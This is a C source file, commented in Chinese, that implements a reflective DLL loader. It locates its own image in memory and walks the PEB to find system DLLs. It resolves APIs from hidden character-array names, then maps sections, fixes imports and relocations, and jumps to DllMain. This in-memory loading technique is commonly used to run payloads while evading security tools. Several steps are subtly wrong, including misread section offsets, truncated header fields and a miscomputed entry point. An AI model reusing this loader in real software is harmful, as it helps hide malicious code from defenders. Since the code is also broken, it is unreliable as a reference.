#include "Reflective.h"

WCHAR ToLowerCaseW(WCHAR ch) {
	if (ch >= L'A' && ch <= L'Z') {
		return ch + (L'a' - L'A');
	}
	return ch;
}

HANDLE GetPEAddress() {
	PVOID funcAddress = _ReturnAddress();
	for (DWORD offset = 0;; offset++) {
		if (*((BYTE*)funcAddress - offset) == 0x5A) {
			if (*((BYTE*)funcAddress - (offset + 1)) == 0x4D) {
				LONG NToffset = *(PLONG)((BYTE*)funcAddress - offset + 0x3b) - 1;
				if (*(PDWORD)((BYTE*)funcAddress - offset + NToffset) == IMAGE_NT_SIGNATURE) {
					return (HANDLE)((BYTE*)funcAddress - (offset + 1));
				}
			}
		}
	}
}

WORD CompareStringW(PWSTR p1, PWSTR p2) {
	while (*p1 || *p2) {
		WCHAR lower_p1 = ToLowerCaseW(*p1);
		WCHAR lower_p2 = ToLowerCaseW(*p2);

		if (lower_p1 != lower_p2) {
			return lower_p1 - lower_p2;
		}
		++p1;
		++p2;
	}
	return 0;  
}

CHAR ToLowerCaseA(CHAR ch) {
	if (ch >= 'A' && ch <= 'Z') {
		return ch + ('a' - 'A');
	}
	return ch;
}

WORD CompareStringA(PSTR p1, PSTR p2) {
	while (*p1 || *p2) {
		CHAR lower_p1 = ToLowerCaseA(*p1);
		CHAR lower_p2 = ToLowerCaseA(*p2);

		if (lower_p1 != lower_p2) {
			return lower_p1 - lower_p2;
		}
		++p1;
		++p2;
	}
	return 0;
}


HANDLE _GetModuleHandle(LPWSTR lpModuleName) {
#ifdef _WIN64
	LPVOID PPEB =(LPVOID)__readgsqword(0x60);
	LPVOID PPLD = *(LPVOID*)((BYTE*)PPEB + 0x18);
	LPVOID PILOML = *(LPVOID*)((BYTE*)PPLD + 0x10);
	while (PILOML) {
		UNICODE_STRING FullDllName = *(UNICODE_STRING*)((BYTE*)PILOML + 0x48);
		if (FullDllName.Length != 0) {
			if (CompareStringW(FullDllName.Buffer,lpModuleName) == 0) {
				return (HANDLE)(*(LPVOID*)((BYTE*)PILOML + 0x30));
			}
			PILOML = *(LPVOID*)PILOML;
		}
		else
		{
			break;
		}
	}
	return NULL;

#else
	LPVOID PPEB = NULL;
	__asm {
		mov eax, fs:[30h]
		mov PPEB, eax
	}
	if (PPEB == NULL) {
		return NULL;
	}
	LPVOID PPLD = *(LPVOID*)((BYTE*)PPEB + 0x0c);
	LPVOID PILOML = *(LPVOID*)((BYTE*)PPLD + 0x0c);
	while (PILOML) {
		UNICODE_STRING FullDllName = *(UNICODE_STRING*)((BYTE*)PILOML + 0x24);
		if (FullDllName.Length != 0) {
			if (CompareStringW(FullDllName.Buffer, lpModuleName) == 0) {
				return (HANDLE)(*(LPVOID*)((BYTE*)PILOML + 0x18));
			}
			PILOML = *(LPVOID*)PILOML;
		}
		else
		{
			break;
		}
	}
	return NULL;
#endif 
}

FARPROC _GetProcAddress(LPVOID hModule, LPSTR lpProcName) {
#ifdef _WIN64
	LPVOID pNt = ((BYTE*)hModule + (*(LONG*)((BYTE*)hModule + 0x3C)));
	LPVOID pExport = ((BYTE*)hModule + (*(LONG*)((BYTE*)pNt + 0x88)));
	DWORD Base = *(PDWORD)((BYTE*)pExport + 0x10);
	DWORD NumberOfFunctions = *(PDWORD)((BYTE*)pExport + 0x14);
	PDWORD pENT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x20)));
	PDWORD pEAT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x1C)));
	PDWORD pEIT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x24))); 
	for (Base;Base<=NumberOfFunctions;Base++) {
		if (CompareStringA((PSTR)((BYTE*)hModule + (*(pENT + Base))), lpProcName) == 0) {
			WORD index = (*(WORD*)((BYTE*)pEIT + (Base*2)));
			return (FARPROC)((BYTE*)hModule + (*(pEAT + index)));
		}
	}
	return NULL;
#else
	LPVOID pNt = ((BYTE*)hModule + (*(LONG*)((BYTE*)hModule + 0x3C)));
	LPVOID pExport = ((BYTE*)hModule + (*(LONG*)((BYTE*)pNt + 0x78)));
	DWORD Base = *(PDWORD)((BYTE*)pExport + 0x10);
	DWORD NumberOfFunctions = *(PDWORD)((BYTE*)pExport + 0x14);
	PDWORD pENT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x20)));
	PDWORD pEAT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x1C)));
	PDWORD pEIT = (PDWORD)((BYTE*)hModule + (*(DWORD*)((BYTE*)pExport + 0x24)));
	for (Base; Base <= NumberOfFunctions; Base++) {
		if (CompareStringA((PSTR)((BYTE*)hModule + (*(pENT + Base))), lpProcName) == 0) {
			WORD index = (*(WORD*)((BYTE*)pEIT + (Base * 2)));
			return (FARPROC)((BYTE*)hModule + (*(pEAT + index)));
		}
	}
	return NULL;
#endif
}

BOOL ReflectiveLoader() {
	/*
		1.定义变量: 要用到的DLL和函数名称、函数指针
	*/
	WCHAR Kernel32[] = { L'c',L':',L'\\',L'w',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L's',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',L'\0' };
	WCHAR Ntdll[] = { L'c',L':',L'\\',L'w',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L's',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l',L'\0' };
	CHAR VirtualAlloc[] = { 'v','i','r','t','u','a','l','a','l','l','o','c','\0' };
	CHAR VirtualProtect[] = { 'v','i','r','t','u','a','l','p','r','o','t','e','c','t','\0' };
	CHAR LoadLibraryA[] = { 'l','o','a','d','l','i','b','r','a','r','y','a','\0' };
	CHAR GetProcAddress[] = { 'g','e','t','p','r','o','c','a','d','d','r','e','s','s','\0'};
	CHAR NtFlushInstructionCache[] = { 'n','t','f','l','u','s','h','i','n','s','t','r','u','c','t','i','o','n','c','a','c','h','e','\0' };
	HANDLE hKernel32 = _GetModuleHandle(Kernel32);
	PVirtualAlloc _VirtualAlloc = (PVirtualAlloc)_GetProcAddress(hKernel32, VirtualAlloc);
	PVirtualProtect _VirtualProtect = (PVirtualProtect)_GetProcAddress(hKernel32, VirtualProtect);
	PLoadLibraryA _LoadLibraryA = (PLoadLibraryA)_GetProcAddress(hKernel32, LoadLibraryA);
	PGetProcAddress __GetProcAddress = (PGetProcAddress)_GetProcAddress(hKernel32, GetProcAddress);
	PNtFlushInstructionCache _NtFlushInstructionCache = (PNtFlushInstructionCache)_GetProcAddress(_GetModuleHandle(Ntdll), NtFlushInstructionCache);

	/*
		2.解析PE文件，获取关键信息
	*/
	LPVOID PEAddress = GetPEAddress(); //PE基址
	LPVOID NTHeaders = ((BYTE*)PEAddress + *(PLONG)((BYTE*)PEAddress + 0x3C)); //NT头
	LPVOID NTOptionHeader = ((BYTE*)NTHeaders + 0x18); //NT拓展头
	DWORD AddressOfEntryPoint = *(PWORD)((BYTE*)NTOptionHeader + 0x10); //程序入口地址RVA
	ULONG64 AddressOfEntryPointOffset = (ULONG64)((BYTE*)NTOptionHeader + 0x10) - (ULONG64)PEAddress; //程序入口地址偏移量
	ULONG64 ImageBaseOffset = (ULONG64)((BYTE*)NTOptionHeader + 0x18) - (ULONG64)PEAddress; //ImageBase的偏移量
	ULONG64 ImageBase = *(PULONG64)((BYTE*)NTOptionHeader + 0x18); //PE中默认映象基址
	DWORD SectionAlignment = *(PWORD)((BYTE*)NTOptionHeader + 0x20); //内存对齐大小
	DWORD FileAlignment = *(PWORD)((BYTE*)NTOptionHeader + 0x24); //磁盘对齐大小
	DWORD SizeOfImage = *(PWORD)((BYTE*)NTOptionHeader + 0x34); //映象文件总大小
	DWORD SizeOfHeaders = *(PWORD)((BYTE*)NTOptionHeader + 0x38); //PE头总大小
	WORD NumberOfSections = *(PWORD)((BYTE*)NTHeaders + 0x10); //节的数量
	LPVOID PImageSectionHeader = ((BYTE*)NTOptionHeader + 0xf0); //节表指针

	/*
		3.申请内存空间，把PE文件内容复制
	*/
	LPVOID DLLHandle = _VirtualAlloc(NULL, SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); //申请内存得到DLL句柄
	if (DLLHandle == NULL) {
		return FALSE;
	}
	for (DWORD i = 0; i < SizeOfHeaders; i++) {
		*((BYTE*)DLLHandle + i) = *((BYTE*)PEAddress + i); //先把PE头复制过去
	}
	*(PULONG64)((BYTE*)DLLHandle + ImageBaseOffset) = (ULONG64)DLLHandle; //修正映象基址
	for (WORD i = 0; i < NumberOfSections; i++) {  //再复制每个节
		DWORD VirtualSize = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0xC); //内存中节的RVA
		DWORD PointerToRawData = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0xC); //磁盘中节的RVA
		DWORD SizeOfRawData = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0x14); //节在磁盘上的大小
		for (DWORD j = 0; j < SizeOfRawData; j++) {
			*((BYTE*)DLLHandle + VirtualSize + j) = *((BYTE*)PEAddress + PointerToRawData + j); //复制节的内容
		}
	}

	/*
		4.修复导入表(IAT)
	*/
	LPVOID PImageImportDescriptor = ((BYTE*)NTOptionHeader + 0x78); //导入目录表指针
	DWORD ImageImportDescriptorVirtualAddress = *(PDWORD)PImageImportDescriptor; //导入表RVA
	DWORD ImageImportDescriptorSize = *((PDWORD)PImageImportDescriptor + 1); //导入表大小
	SIZE_T DLLcount = (ImageImportDescriptorSize / sizeof(IMAGE_DATA_DIRECTORY)) - 1; //需要导入DLL的数量
	LPVOID PImageImport = ((BYTE*)DLLHandle + ImageImportDescriptorVirtualAddress); //实际导入表地址
	for (DWORD i = 0; i < DLLcount; i++) {
		DWORD NameRVA = *(PDWORD)((BYTE*)PImageImport + i * 0x14 + 0xC); //DLL名称的RVA
		LPSTR DLLName = ((CHAR*)DLLHandle + NameRVA); //获取DLL名称
		HMODULE DLLHmodule = _LoadLibraryA(DLLName);//加载DLL
		if (DLLHmodule == NULL) {
			return FALSE;
		}
		DWORD FirstThunk = *(PDWORD)((BYTE*)PImageImport + i * 0x14 + 0x10); //获取导入函数表(IAT)RVA
		DWORD OriginalFirstThunk = *(PDWORD)((BYTE*)PImageImport + i * 0x14); //获取INT表RVA
		LPVOID PIAT = ((BYTE*)DLLHandle + FirstThunk); //IAT表的地址
		LPVOID PINT = ((BYTE*)DLLHandle + OriginalFirstThunk); //INT表的地址
		for (DWORD j = 0;;j++) {
			if (*((PULONG64)PIAT + j ) == 0) {
				break;
			}
			if (IS_HIGHEST_BIT_SET(*((PULONG64)PINT + j))) { //如果最高位为1，则表示函数的序号
				WORD ordinal = *(PWORD)((PULONG64)PINT + j);
				FARPROC funcAddress = __GetProcAddress(DLLHmodule,(LPCSTR)ordinal); //通过序号获取函数地址
				if (funcAddress == NULL) {
					return FALSE;
				}
				*((PULONG64)PIAT + j) = (ULONG64)funcAddress; //修复IAT表的地址
			}
			else //如果最高位为0，则表示是IMAGE_IMPORT_BY_NAME的RVA
			{
				ULONG64 ImageThunkRVA = *((PULONG64)PINT + j);
				LPCSTR funcName = (LPCSTR)((BYTE*)DLLHandle + ImageThunkRVA + 2); //函数名称 
				FARPROC funcAddress = __GetProcAddress(DLLHmodule, funcName); //通过函数名称获取函数地址
				if (funcAddress == NULL) {
					return FALSE;
				}
				*((PULONG64)PIAT + j) = (ULONG64)funcAddress; //修复IAT表的地址
			}
		}
	}

	/*
		5.修复重定位表
	*/
	LPVOID PImageBaseRelocation = ((BYTE*)NTOptionHeader + 0x98); //重定位目录表指针
	DWORD ImageBaseRelocationVirtualAddress = *(PDWORD)PImageBaseRelocation; //重定位表RVA
	DWORD ImageBaseRelocationSize = *((PDWORD)PImageBaseRelocation + 1); //重定位表大小
	ULONG64 Difference = (ULONG64)DLLHandle - ImageBase; //计算映象地址差值
	LPVOID RelocationAddress = ((BYTE*)DLLHandle + ImageBaseRelocationVirtualAddress);  //重定位表地址
	DWORD UsedSize = 0; //已使用重定位表大小
	do {
		RelocationAddress = (BYTE*)(RelocationAddress) + UsedSize;
		LPVOID ActualAddress = ((BYTE*)DLLHandle + *(PDWORD)RelocationAddress); //实际要重定位的地址
		DWORD RelocationCount = (*((PDWORD)RelocationAddress + 1) - 8) / 2; //要重定位地址的数量
		for (DWORD i = 0; i < RelocationCount; i++) {
			DWORD Offset = (DWORD)EXTRACT_LOW_12_BITS(*((PWORD)((BYTE*)RelocationAddress + 8) + i));//提取低12位得到重定位地址偏移量
			*(PULONG64)((BYTE*)ActualAddress + Offset) += Difference; //修正地址为重定位地址
		}
		UsedSize += *((PDWORD)RelocationAddress + 1);
	} while (ImageBaseRelocationSize > UsedSize);

	/*
		6.为节分配正确的内存属性
	*/
	for (WORD i = 0; i < NumberOfSections; i++) { 
		DWORD VirtualSize = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0xC); //内存中节的RVA
		DWORD SizeOfRawData = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0x14); //节在磁盘上的大小
		DWORD Characteristics = *(PDWORD)((BYTE*)PImageSectionHeader + i * 0x28 + 0x24); //节的内存属性
		DWORD OldProtect = 0;
		if (!_VirtualProtect(((BYTE*)DLLHandle + VirtualSize), SizeOfRawData, Characteristics,&OldProtect)) {
			return FALSE;
		}
	}

	/*
		7.调用DLL入口函数
	*/
	if (!_NtFlushInstructionCache((HANDLE)-1, NULL, NULL)) { //刷新当前进程的指令缓存
		return FALSE;
	}
	PDllMain _DllMain = (PDllMain)((BYTE*)DLLHandle + AddressOfEntryPointOffset); //DLL入口函数指针
	return _DllMain((HINSTANCE)DLLHandle,DLL_PROCESS_ATTACH,NULL); //转到DLL入口函数开始执行
}